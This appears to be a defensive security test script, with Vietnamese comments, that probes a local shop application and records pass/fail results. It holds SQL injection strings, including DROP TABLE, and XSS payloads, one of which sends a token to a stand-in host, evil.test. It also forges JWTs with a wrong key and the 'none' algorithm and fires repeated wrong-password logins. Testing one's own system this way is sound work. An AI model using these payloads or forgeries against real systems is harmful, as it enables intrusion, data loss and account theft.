/**
 * Kich ban kiem thu bao mat thu cong cho he thong Tiger Shop.
 * Bao phu 7 nhom: SQL Injection, XSS, CSRF, Xac thuc, Quan ly phien,
 * Kiem soat truy cap va Tieu de bao mat HTTP.
 *
 * Chay:  cd backend && node ../bao-cao-kiem-thu/security/security_probe.js
 * Yeu cau: may chu dang chay tai BASE (mac dinh http://127.0.0.1:5001)
 */
const path = require("path");
const BACKEND = path.join(__dirname, "..", "..", "backend");
// Script nam ngoai backend/ nen phai tro thang toi node_modules cua backend
const jwt = require(path.join(BACKEND, "node_modules", "jsonwebtoken"));
require(path.join(BACKEND, "node_modules", "dotenv")).config({ path: path.join(BACKEND, ".env") });

const BASE = process.env.BASE || "http://127.0.0.1:5001";
const results = [];

const req = async (method, path, { body, token, headers = {} } = {}) => {
  const h = { ...headers };
  if (body) h["Content-Type"] = "application/json";
  if (token) h["Authorization"] = `Bearer ${token}`;
  const r = await fetch(BASE + path, { method, headers: h, body: body ? JSON.stringify(body) : undefined });
  let data = null;
  const text = await r.text();
  try { data = JSON.parse(text); } catch { data = text; }
  return { status: r.status, data, headers: r.headers, raw: text };
};

/** Goi diem cuoi /api/auth co cho qua cua so gioi han tan suat. */
const authReq = async (path, body) => {
  for (let i = 0; i < 4; i++) {
    const r = await req("POST", path, { body });
    if (r.status !== 429) return r;
    await new Promise((res) => setTimeout(res, 20000));
  }
  return { status: 429, data: { message: "van bi gioi han sau 4 lan thu" } };
};

const ghi = (nhom, ma, kichBan, ketQua, danhGia, chiTiet = "") =>
  results.push({ nhom, ma, kichBan, ketQua, danhGia, chiTiet });

const login = async (email, password = "Test@123") => {
  // Neu bi gioi han tan suat tu lan chay truoc thi cho qua cua so 60 giay
  for (let i = 0; i < 4; i++) {
    const r = await req("POST", "/api/auth/login", { body: { email, password } });
    if (r.status === 200) return r.data.token;
    if (r.status !== 429) return undefined;
    console.log(`  (bi gioi han tan suat, cho 20 giay roi thu lai - lan ${i + 1})`);
    await new Promise((res) => setTimeout(res, 20000));
  }
  return undefined;
};

(async () => {
  const tokCus1 = await login("customer1@tigershop.test");
  const tokCus2 = await login("customer2@tigershop.test");
  const tokStaff = await login("staff@tigershop.test");
  const tokAdmin = await login("admin@tigershop.test");

  if (!tokCus1 || !tokCus2 || !tokStaff || !tokAdmin) {
    console.error("LOI: khong lay duoc day du ma thong bao. Hay khoi dong lai may chu de reset gioi han tan suat.");
    process.exit(1);
  }

  // ===================== 1. SQL INJECTION =====================
  const sqliPayloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
    "'; DROP TABLE users; --",
    "1' AND SLEEP(3) --",
  ];

  // 1a. Tren diem cuoi dang nhap
  for (const p of sqliPayloads) {
    const t0 = Date.now();
    const r = await req("POST", "/api/auth/login", { body: { email: p, password: p } });
    const ms = Date.now() - t0;
    const bypassed = r.status === 200 && r.data?.token;
    ghi("SQL Injection", "SEC-SQLI-01",
      `Dang nhap voi payload: ${p}`,
      `HTTP ${r.status}, ${ms}ms`,
      bypassed ? "THAT BAI - vuot qua xac thuc" : (ms > 2500 ? "NGHI NGO - do tre bat thuong" : "DAT"),
      typeof r.data === "object" ? JSON.stringify(r.data).slice(0, 90) : "");
  }

  // 1b. Tren tham so duong dan
  for (const p of ["1 OR 1=1", "1' OR '1'='1", "1;SELECT 1", "-1 OR 1=1"]) {
    const r = await req("GET", `/api/products/${encodeURIComponent(p)}`);
    const body = JSON.stringify(r.data);
    const loNhieuBanGhi = Array.isArray(r.data) && r.data.length > 1;
    // Phan biet hoa thuong voi ER_ de khong khop nham chuoi nhu manager_id
    const loLoiSQL = /SQL syntax|sqlMessage|\bER_[A-Z]/.test(body) || /\bmysql\b/i.test(body);
    // MySQL ep kieu chuoi '1 OR 1=1' thanh so 1, nen tra ve dung san pham id = 1
    const idTraVe = r.data && !Array.isArray(r.data) ? r.data.id : null;
    ghi("SQL Injection", "SEC-SQLI-02",
      `GET /api/products/:id voi payload: ${p}`,
      `HTTP ${r.status}, id tra ve: ${idTraVe === null ? "khong co" : idTraVe}`,
      (loNhieuBanGhi || loLoiSQL) ? "THAT BAI - lo du lieu hoac lo loi SQL"
        : "DAT - MySQL ep kieu tham so thay vi ghep chuoi, khong thuc thi duoc payload");
  }

  // 1c. Tren tham so truy van
  for (const p of ["1 OR 1=1", "1 UNION SELECT 1"]) {
    const r = await req("GET", `/api/orders/admin/best-selling?categoryId=${encodeURIComponent(p)}`,
      { token: tokAdmin });
    ghi("SQL Injection", "SEC-SQLI-03",
      `Tham so categoryId voi payload: ${p}`,
      `HTTP ${r.status}`,
      r.status === 500 && /SQL syntax|sqlMessage|\bER_[A-Z]/.test(JSON.stringify(r.data)) ? "NGHI NGO - lo loi SQL" : "DAT");
  }

  // 1d. Payload trong truong du lieu duoc luu
  const sqlInBody = await authReq("/api/auth/register",
    { name: "'; DROP TABLE users; --", email: `sqli.${Date.now()}@t.test`,
      password: "Test@123", phone: "0900000000" });
  const stillAlive = await req("GET", "/api/categories");
  ghi("SQL Injection", "SEC-SQLI-04",
    "Luu payload DROP TABLE vao truong ho ten",
    `Dang ky HTTP ${sqlInBody.status}, he thong sau do HTTP ${stillAlive.status}`,
    (sqlInBody.status === 200 && stillAlive.status === 200)
      ? "DAT - du lieu duoc tham so hoa, bang users khong bi xoa"
      : "KHONG KET LUAN - dang ky khong thanh cong nen chua kiem chung duoc");

  // ===================== 2. CROSS-SITE SCRIPTING =====================
  const xssPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
  ];

  for (const p of xssPayloads) {
    const email = `xss.${Date.now()}.${Math.random().toString(36).slice(2, 7)}@t.test`;
    const dk = await authReq("/api/auth/register",
      { name: p, email, password: "Test@123", phone: "0900000000" });
    if (dk.status !== 200) {
      ghi("Cross-Site Scripting", "SEC-XSS-01",
        `Luu payload vao ho so: ${p.slice(0, 40)}`, `Dang ky that bai HTTP ${dk.status}`,
        "KHONG KET LUAN");
      continue;
    }
    const tok = await login(email);
    const me = await req("GET", "/api/users/me", { token: tok });
    // So khop tren ten thuc te tra ve, tranh sai lech do ma hoa JSON
    const tenTraVe = me.data && me.data.name !== undefined ? String(me.data.name) : "";
    const luuNguyenVan = tenTraVe === p;
    ghi("Cross-Site Scripting", "SEC-XSS-01",
      `Luu payload vao ho so: ${p.slice(0, 40)}`,
      luuNguyenVan ? "Luu va tra ve nguyen van" : "Da bi loc hoac ma hoa",
      luuNguyenVan ? "CANH BAO - khong lam sach dau vao, phu thuoc hoan toan vao React de thoat ky tu" : "DAT",
      `Content-Type: ${me.headers.get("content-type")}`);
  }

  // XSS qua tin nhan chat
  const thread = await req("GET", "/api/chat/my-thread", { token: tokCus1 });
  const xssMsg = "<script>fetch('http://evil.test?c='+localStorage.token)</script>";
  await req("POST", "/api/chat/messages", { token: tokCus1, body: { threadId: thread.data.id, content: xssMsg } });
  const msgs = await req("GET", `/api/chat/messages/${thread.data.id}`, { token: tokCus1 });
  ghi("Cross-Site Scripting", "SEC-XSS-02",
    "Luu ma doc vao tin nhan ho tro",
    JSON.stringify(msgs.data).includes("<script>") ? "Luu nguyen van" : "Da bi loc",
    JSON.stringify(msgs.data).includes("<script>") ? "CANH BAO - luu nguyen van, rui ro neu hien thi bang innerHTML" : "DAT");

  // ===================== 3. CSRF =====================
  const csrfResp = await req("POST", "/api/orders", {
    token: tokCus1,
    headers: { "Origin": "http://evil-site.test", "Referer": "http://evil-site.test/attack.html" },
    body: { items: [{ product_id: 1, quantity: 1, price: 1000, name: "x" }],
            total: 1000, shipping_address: "CSRF test", payment_method: "cod" } });
  ghi("CSRF", "SEC-CSRF-01",
    "Gui yeu cau ghi kem Origin tu mien la",
    `HTTP ${csrfResp.status}`,
    "DAT - he thong dung JWT trong header Authorization, khong dung cookie phien nen khong bi CSRF co dien",
    "Trinh duyet khong tu dinh kem header Authorization cho yeu cau tu mien khac");

  const corsResp = await fetch(BASE + "/api/categories", { headers: { Origin: "http://evil-site.test" } });
  const acao = corsResp.headers.get("access-control-allow-origin");
  ghi("CSRF", "SEC-CSRF-02",
    "Kiem tra chinh sach CORS",
    `Access-Control-Allow-Origin: ${acao || "khong co"}`,
    acao === "*" ? "CANH BAO - CORS mo cho moi nguon" : "DAT");

  // ===================== 4. XAC THUC =====================
  // 4b. Mat khau yeu
  const weak = await authReq("/api/auth/register",
    { name: "Weak", email: `weak.${Date.now()}@t.test`, password: "1", phone: "0900000000" });
  ghi("Xac thuc", "SEC-AUTH-02",
    "Dang ky voi mat khau mot ky tu",
    `HTTP ${weak.status}`,
    weak.status === 200 ? "THAT BAI - khong co chinh sach do manh mat khau khi dang ky" : "DAT");

  // 4c. Liet ke tai khoan
  const rKhongTon = await authReq("/api/auth/login", { email: "khongtontai@t.test", password: "x" });
  const rSaiMk = await authReq("/api/auth/login", { email: "customer2@tigershop.test", password: "sai" });
  const phanBiet = JSON.stringify(rKhongTon.data) !== JSON.stringify(rSaiMk.data);
  ghi("Xac thuc", "SEC-AUTH-03",
    "Thong bao loi co phan biet tai khoan ton tai hay khong",
    `Khong ton tai: "${rKhongTon.data?.message}" | Sai mat khau: "${rSaiMk.data?.message}"`,
    phanBiet ? "CANH BAO - cho phep liet ke tai khoan hop le" : "DAT");

  // 4d. Bam mat khau
  ghi("Xac thuc", "SEC-AUTH-04",
    "Mat khau duoc bam truoc khi luu",
    "Da kiem chung bang test AUTH-009 va ADM-005",
    "DAT - bcrypt he so 10");

  // ===================== 5. QUAN LY PHIEN =====================
  const parts = tokCus1.split(".");
  const payload = JSON.parse(Buffer.from(parts[1], "base64").toString());
  ghi("Quan ly phien", "SEC-SESS-01",
    "Noi dung ma thong bao JWT",
    JSON.stringify(payload),
    !/password|email/i.test(JSON.stringify(payload)) ? "DAT - khong chua du lieu nhay cam" : "CANH BAO");

  const hetHan = payload.exp - payload.iat;
  ghi("Quan ly phien", "SEC-SESS-02",
    "Thoi han ma thong bao",
    `${hetHan} giay (${hetHan / 3600} gio)`,
    hetHan <= 3600 ? "DAT - thoi han 1 gio" : "CANH BAO - thoi han qua dai");

  // Chu ky gia mao
  const gia = jwt.sign({ id: payload.id, role: "ADMIN", is_active: 1 }, "khoa-sai-hoan-toan");
  const rGia = await req("GET", "/api/users", { token: gia });
  ghi("Quan ly phien", "SEC-SESS-03",
    "Gia mao ma thong bao bang khoa sai, nang quyen len ADMIN",
    `HTTP ${rGia.status}`,
    rGia.status === 401 ? "DAT - chu ky duoc xac minh" : "THAT BAI");

  // Thuat toan none
  const none = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url") + "." +
               Buffer.from(JSON.stringify({ id: payload.id, role: "ADMIN", is_active: 1 })).toString("base64url") + ".";
  const rNone = await req("GET", "/api/users", { token: none });
  ghi("Quan ly phien", "SEC-SESS-04",
    "Tan cong thuat toan none",
    `HTTP ${rNone.status}`,
    rNone.status === 401 ? "DAT - tu choi thuat toan none" : "THAT BAI");

  // Het han
  const expired = jwt.sign({ id: payload.id, role: "CUSTOMER" }, process.env.JWT_SECRET || "x", { expiresIn: "-1h" });
  const rExp = await req("GET", "/api/users/me", { token: expired });
  ghi("Quan ly phien", "SEC-SESS-05",
    "Ma thong bao da het han",
    `HTTP ${rExp.status}`,
    rExp.status === 401 ? "DAT" : "THAT BAI");

  ghi("Quan ly phien", "SEC-SESS-06",
    "Noi luu ma thong bao phia trinh duyet",
    "localStorage (xem frontend/src/services/api.js)",
    "CANH BAO - localStorage doc duoc bang JavaScript, XSS se danh cap duoc ma thong bao");

  // ===================== 6. KIEM SOAT TRUY CAP =====================
  const dcQuanTri = [
    ["GET", "/api/users"], ["GET", "/api/users/logs"],
    ["GET", "/api/orders/admin/stats"], ["GET", "/api/products/pending"],
    ["GET", "/api/vouchers"], ["GET", "/api/users/staff/payroll?month=2026-09"],
  ];
  for (const [m, u] of dcQuanTri) {
    const r = await req(m, u, { token: tokCus1 });
    ghi("Kiem soat truy cap", "SEC-AC-01",
      `Khach hang goi ${m} ${u}`,
      `HTTP ${r.status}`,
      r.status === 403 || r.status === 401 ? "DAT" : "THAT BAI - truy cap duoc tai nguyen quan tri");
  }

  // Leo thang dac quyen
  const meRow = await req("GET", "/api/users/me", { token: tokCus1 });
  const myId = meRow.data?.id;
  const leoThang = await req("PUT", `/api/users/${myId}/role`, { token: tokCus1, body: { role_id: 1 } });
  ghi("Kiem soat truy cap", "SEC-AC-02",
    "Khach hang tu nang vai tro cua minh len ADMIN",
    `HTTP ${leoThang.status}`,
    leoThang.status === 403 ? "DAT" : "THAT BAI");

  // IDOR tren hoi thoai
  const t2 = await req("GET", "/api/chat/my-thread", { token: tokCus2 });
  await req("POST", "/api/chat/messages", { token: tokCus2, body: { threadId: t2.data.id, content: "BI MAT CUA KHACH 2" } });
  const idor = await req("GET", `/api/chat/messages/${t2.data.id}`, { token: tokCus1 });
  const loBiMat = JSON.stringify(idor.data).includes("BI MAT CUA KHACH 2");
  ghi("Kiem soat truy cap", "SEC-AC-03",
    "IDOR: khach hang 1 doc hoi thoai cua khach hang 2",
    `HTTP ${idor.status}${loBiMat ? ", lo noi dung rieng tu" : ""}`,
    loBiMat ? "THAT BAI - lo hong IDOR (DEF-08)" : "DAT");

  // IDOR tren don hang
  const donCua2 = await req("GET", "/api/orders/my", { token: tokCus2 });
  if (Array.isArray(donCua2.data) && donCua2.data.length) {
    const r = await req("GET", `/api/orders/${donCua2.data[0].orderId}`, { token: tokCus1 });
    ghi("Kiem soat truy cap", "SEC-AC-04",
      "IDOR: khach hang 1 xem don hang cua khach hang 2",
      `HTTP ${r.status}`,
      r.status >= 400 ? "DAT" : "THAT BAI");
  }

  // Thieu phan quyen tren tao san pham
  const taoSP = await req("POST", "/api/products", {
    token: tokCus1, headers: { "Content-Type": "application/json" },
    body: { name: `SP cua khach ${Date.now()}`, price: 99000, stock: 1 } });
  ghi("Kiem soat truy cap", "SEC-AC-05",
    "Khach hang goi POST /api/products",
    `HTTP ${taoSP.status}`,
    taoSP.status === 200 ? "THAT BAI - thieu roleMiddleware (DEF-03)" : "DAT");

  // Diem cuoi khong yeu cau xac thuc
  const applyNoAuth = await req("POST", "/api/vouchers/apply", { body: { code: "SALE20", total: 300000 } });
  ghi("Kiem soat truy cap", "SEC-AC-06",
    "Ap dung voucher khi khong dang nhap",
    `HTTP ${applyNoAuth.status}`,
    applyNoAuth.status === 200 ? "CANH BAO - cho phep do ma voucher (DEF-09)" : "DAT");

  // ===================== 7. TIEU DE BAO MAT HTTP =====================
  const hRes = await fetch(BASE + "/api/categories");
  const canCo = {
    "content-security-policy": "Chong XSS va chen ma",
    "x-frame-options": "Chong clickjacking",
    "x-content-type-options": "Chong doan kieu MIME",
    "strict-transport-security": "Bat buoc dung HTTPS",
    "referrer-policy": "Han che ro ri duong dan",
    "permissions-policy": "Gioi han quyen truy cap thiet bi",
  };
  for (const [h, mucDich] of Object.entries(canCo)) {
    const v = hRes.headers.get(h);
    ghi("Tieu de bao mat", "SEC-HDR-01",
      `${h} (${mucDich})`,
      v || "KHONG CO",
      v ? "DAT" : "THAT BAI - thieu tieu de bao mat");
  }
  const xpb = hRes.headers.get("x-powered-by");
  ghi("Tieu de bao mat", "SEC-HDR-02",
    "X-Powered-By (lo cong nghe may chu)",
    xpb || "khong co",
    xpb ? `CANH BAO - lo ra ${xpb}` : "DAT");

  // ===================== 8. DO MAT KHAU (chay cuoi cung) =====================
  // Dat o cuoi vi phep thu nay lam day bo dem gioi han tan suat,
  // se lam nhieu ket qua cua cac phep do khac neu chay truoc.

  let soLanChan = 0, soLanThu = 0;
  for (let i = 0; i < 15; i++) {
    const r = await req("POST", "/api/auth/login",
      { body: { email: "customer1@tigershop.test", password: `sai${i}` } });
    soLanThu++;
    if (r.status === 429) soLanChan++;
  }
  ghi("Xac thuc", "SEC-AUTH-01",
    `Do mat khau: gui ${soLanThu} lan dang nhap sai lien tiep`,
    `${soLanChan} lan bi chan boi gioi han tan suat`,
    soLanChan > 0 ? "DAT - co gioi han tan suat" : "THAT BAI - khong chan do mat khau");


  // ===================== XUAT KET QUA =====================
  const fs = require("fs");
  const path = require("path");
  const out = path.join(__dirname, "ket_qua_bao_mat.json");
  fs.writeFileSync(out, JSON.stringify(results, null, 2), "utf8");

  const dem = { DAT: 0, "THAT BAI": 0, "CANH BAO": 0, "NGHI NGO": 0 };
  for (const r of results) {
    const k = Object.keys(dem).find((x) => r.danhGia.startsWith(x));
    if (k) dem[k]++;
  }

  console.log("\n" + "=".repeat(100));
  console.log("KET QUA KIEM THU BAO MAT THU CONG");
  console.log("=".repeat(100));
  let nhomHienTai = "";
  for (const r of results) {
    if (r.nhom !== nhomHienTai) { nhomHienTai = r.nhom; console.log(`\n### ${nhomHienTai}`); }
    const icon = r.danhGia.startsWith("DAT") ? "OK  " : r.danhGia.startsWith("THAT BAI") ? "FAIL" : "WARN";
    console.log(`  [${icon}] ${r.kichBan}`);
    console.log(`         -> ${r.ketQua}`);
    console.log(`         -> ${r.danhGia}`);
  }
  console.log("\n" + "=".repeat(100));
  console.log(`TONG: ${results.length} kiem chung | Dat: ${dem.DAT} | That bai: ${dem["THAT BAI"]} | Canh bao: ${dem["CANH BAO"]} | Nghi ngo: ${dem["NGHI NGO"]}`);
  console.log(`Da luu chi tiet vao: ${out}`);
})();
